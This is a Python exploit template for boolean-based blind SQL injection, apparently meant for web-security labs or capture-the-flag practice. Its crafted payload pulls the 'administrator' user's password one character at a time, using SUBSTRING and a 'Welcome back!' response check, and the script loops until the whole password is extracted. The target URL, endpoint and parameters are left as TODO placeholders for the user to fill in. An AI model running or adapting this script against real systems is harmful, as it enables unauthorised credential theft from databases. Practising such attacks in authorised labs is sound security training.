import time
import requests

from urllib.parse import quote

charset = "0123456789abcdefghijklmnopqrstuvwxyz"

def craft_query(i: int, letter: str) -> str:
    """
    Crafts the query for the given letter.


    Useful SQLi functions for crafting your payload:
    -  SUBSTR(string, start, length)
    -  SUBSTRING(string, start, length)
    

    :param i: The index of the letter.
    :param letter: The letter to craft the query for.

    :return: The crafted query.
    """

    # TODO: Choose the SQL query to craft
    query = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username = 'administrator') = '{letter}"
    return query


def make_request(i: int, letter: str) -> requests.Response:
    query = craft_query(i, letter)

    # TODO: Choose METHOD, url, endpoint, params, data, cookies, headers
    METHOD = "GET"
    url = "https://example.com"
    endpoint = "/fake"
    params = {}
    data = {}
    cookies = {}

    headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" }

    response = requests.request(METHOD, url + endpoint, params=params, cookies=cookies, data=data, headers=headers)
    return response


def is_found(response: requests.Response) -> bool:
    return "Welcome back!" in response.text


def exploit(verbose: bool = False) -> None:
    """
    This function exploits the blind SQLi vulnerability.
    It will exfiltrate data from the database.

    :param verbose: Prints the log in the console.

    :return: None
    """
    finished = False
    exfil = ""
    exfil_index = 1
    while not finished:
        response = None
        for i, letter in enumerate(charset):
            log(f"[{exfil_index}] Trying letter : {letter}", verbose=verbose)

            t = time.time()
            response = make_request(exfil_index, letter)
            log(f"[{exfil_index}] Time taken : {time.time() - t}", verbose=verbose)

            if is_found(response):
                log(f"[{exfil_index}] Found: {letter}", verbose=verbose, force=True)
                exfil += letter
                exfil_index += 1
                break
            
            if i == len(charset) - 1:
                log("[+] No more letters to try.", verbose=verbose)
                finished = True
                break
            log("======================================================================", verbose=verbose)

    log(f"[+] Exfiltration : `{exfil}`", verbose=verbose, force=True)


def log(msg: str, verbose: bool = False, force: bool = False) -> None:
    if force:
        verbose = True

    if verbose:
        print(msg)


if __name__ == "__main__":
    # TODO: Choose verbose mode
    exploit(verbose=False)
